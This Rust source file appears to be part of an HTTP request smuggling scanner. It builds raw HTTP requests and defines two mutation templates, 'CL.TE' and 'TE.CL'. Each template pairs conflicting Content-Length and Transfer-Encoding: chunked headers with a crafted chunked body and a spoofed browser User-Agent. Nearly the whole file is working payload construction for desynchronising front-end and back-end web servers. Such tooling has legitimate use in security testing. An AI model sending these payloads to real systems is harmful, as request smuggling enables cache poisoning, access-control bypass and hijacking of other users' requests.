use rand::{Rng, distributions::Alphanumeric};
use std::collections::HashMap;

fn random_string(len: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect()
}

pub struct Request {
    method: String,
    path: String,
    headers: HashMap<String, String>,
    body: String,
}

impl Request {
    pub fn raw_format(&self) -> String {
        let mut raw_palyload = format!("{} {} HTTP/1.1\r\n", &self.method, &self.path);
        for (header, value) in &self.headers {
            raw_palyload.push_str(format!("{}: {}\r\n", header, value).as_str());
        }
        raw_palyload.push_str("\r\n");
        raw_palyload.push_str(&self.body);
        raw_palyload
    }
}

pub struct Mutation {
    pub name: &'static str,
    pub payload_template: Request,
}

impl Mutation {
    pub fn new_default_mutation(method: &String, host: &String, path: &String) -> Vec<Mutation> {
        let mut resualt = vec![Mutation {
            name: "CL.TE",
            payload_template: Request {
                method: method.clone(),
                path: path.clone(),
                headers: {
                    let mut headers = HashMap::new();
                    headers.insert("Host".to_string(), host.clone());
                    headers.insert("User-Agent".to_string(),"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36".to_string());
                    headers.insert(
                        "Content-type".to_string(),
                        "application/x-www-form-urlencoded; charset=UTF-8".to_string(),
                    );

                    headers.insert("Transfer-Encoding".to_string(), "chunked".to_string());
                    headers
                },
                body: format!("0\r\n\r\n{} ",random_string(16)),
            },
        },
        Mutation {
            name: "TE.CL",
            payload_template : Request {
                method: method.clone(),
                path: path.clone(),
                headers: {
                    let mut headers = HashMap::new();
                    headers.insert("Host".to_string(), host.clone());
                    headers.insert("User-Agent".to_string(),"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36".to_string());
                    headers.insert(
                        "Content-type".to_string(),
                        "application/x-www-form-urlencoded; charset=UTF-8".to_string(),
                    );
                    headers.insert("Transfer-Encoding".to_string(), "chunked".to_string());
                    headers
                },
                body: format!("5\r\nHELLO\r\n0\r\n\r\n{} ",random_string(16)),
            }
        }
        ];
        resualt.iter_mut().for_each(|mutation| {
            match mutation.name {
                "CL.TE" => {
                    let content_len = mutation.payload_template.body.len().to_string();
                    mutation
                    .payload_template
                    .headers
                    .entry("Content-Length".to_string())
                    .or_insert(content_len);
                },
                "TE.CL" => {
                    mutation
                    .payload_template
                    .headers
                    .entry("Content-Length".to_string())
                    .or_insert(5.to_string());
                }
                _ => {}
            }
        });
        resualt
    }
    pub fn raw_format(&self) -> String {
        self.payload_template.raw_format()
    }

}
